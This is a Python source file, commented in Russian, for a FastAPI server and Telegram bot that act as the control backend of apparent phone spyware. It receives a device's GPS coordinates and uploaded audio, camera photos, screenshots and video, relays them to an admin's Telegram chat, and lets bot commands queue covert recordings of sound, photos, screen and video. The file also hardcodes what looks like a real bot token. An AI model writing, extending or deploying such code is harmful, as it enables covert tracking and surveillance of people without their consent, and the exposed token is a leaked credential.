import os
import asyncio
from contextlib import asynccontextmanager
from fastapi import FastAPI, File, Form, UploadFile
import aiofiles
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

TOKEN = os.getenv("BOT_TOKEN", "9055891475:AAFnWF9ZR6yU38riMbEVMlAFPhMv9Q54cXY")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # 8274122612
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Хранилище состояния и очередь команд для телефона
state = {
    "device_id": "нет данных",
    "latitude": 0.0,
    "longitude": 0.0,
    "pending_command": "none"  # Возможные команды: "none", "record_audio", "take_photo", "take_screenshot", "record_video"
}

@asynccontextmanager
async def lifespan(app: FastAPI):
    polling_task = asyncio.create_task(dp.start_polling(bot))
    yield
    polling_task.cancel()

app = FastAPI(lifespan=lifespan)

# --- Универсальный эндпоинт для приема данных от телефона ---
@app.post("/api/report")
async def receive_data(
    device_id: str = Form(...),
    latitude: float = Form(...),
    longitude: float = Form(...),
    media_type: str = Form("none"),  # "audio", "photo", "screenshot", "video"
    file: UploadFile = File(None)
):
    state["device_id"] = device_id
    state["latitude"] = latitude
    state["longitude"] = longitude

    # Обработка и пересылка файлов в Telegram
    if file and file.filename and ADMIN_ID:
        file_path = os.path.join(UPLOAD_DIR, file.filename)
        async with aiofiles.open(file_path, "wb") as buffer:
            await buffer.write(await file.read())
        
        caption = f"📱 Устройство: <code>{device_id}</code>"
        
        try:
            if media_type == "audio":
                await bot.send_audio(chat_id=ADMIN_ID, audio=types.FSInputFile(file_path), caption=f"🎙 Аудиозапись (звук)\n{caption}")
            elif media_type == "photo":
                await bot.send_photo(chat_id=ADMIN_ID, photo=types.FSInputFile(file_path), caption=f"📸 Фото с камеры\n{caption}")
            elif media_type == "screenshot":
                await bot.send_photo(chat_id=ADMIN_ID, photo=types.FSInputFile(file_path), caption=f"🖥 Скриншот экрана\n{caption}")
            elif media_type == "video":
                await bot.send_video(chat_id=ADMIN_ID, video=types.FSInputFile(file_path), caption=f"📹 Видеозапись\n{caption}")
        except Exception as e:
            print(f"Ошибка отправки файла в Telegram: {e}")

    # Отдаем телефончику его следующую команду и сбрасываем её
    cmd_to_send = state["pending_command"]
    state["pending_command"] = "none"
    
    return {"status": "ok", "command": cmd_to_send}


# --- Telegram-бот для управления и мониторинга ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        f"Ваш ID: <code>{message.from_user.id}</code>\n\n"
        "🎛 <b>Панель управления:</b>\n"
        "/location — Показать текущие координаты\n"
        "/listen — Записать звук вокруг (30 сек)\n"
        "/photo — Сделать фото с камеры\n"
        "/screenshot — Сделать скриншот экрана\n"
        "/video — Записать видео (10 сек)"
    )

@dp.message(Command("location"))
async def cmd_location(message: types.Message):
    lat, lon = state["latitude"], state["longitude"]
    if lat == 0.0 and lon == 0.0:
        await message.answer("⚠️ Данных от устройства еще нет.")
        return
    await message.answer(
        f"📍 Устройство: <code>{state['device_id']}</code>\n"
        f"Координаты: <code>{lat}, {lon}</code>\n"
        f"<a href='https://maps.google.com/?q={lat},{lon}'>Открыть на карте Google Maps</a>"
    )

@dp.message(Command("listen"))
async def cmd_listen(message: types.Message):
    state["pending_command"] = "record_audio"
    await message.answer("⏳ Команда на запись звука отправлена в очередь.")

@dp.message(Command("photo"))
async def cmd_photo(message: types.Message):
    state["pending_command"] = "take_photo"
    await message.answer("⏳ Команда на фото отправлена в очередь.")

@dp.message(Command("screenshot"))
async def cmd_screenshot(message: types.Message):
    state["pending_command"] = "take_screenshot"
    await message.answer("⏳ Команда на скриншот отправлена в очередь.")

@dp.message(Command("video"))
async def cmd_video(message: types.Message):
    state["pending_command"] = "record_video"
    await message.answer("⏳ Команда на запись видео отправлена в очередь.")
